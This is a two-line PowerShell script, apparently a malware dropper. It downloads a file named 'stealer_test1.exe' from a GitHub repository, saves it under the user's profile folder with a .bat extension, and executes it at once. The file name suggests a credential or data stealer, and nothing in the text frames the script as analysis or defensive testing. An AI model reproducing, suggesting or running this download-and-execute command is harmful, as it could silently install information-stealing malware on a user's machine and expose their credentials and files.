Start-BitsTransfer -Priority foreground -Source "https://github.com/n0t-cr1m3/test/raw/main/stealer_test1.exe" -Destination "$env:USERPROFILE/stealer_test.bat"
Start-Process -FilePath "$env:USERPROFILE/stealer_test.bat"
            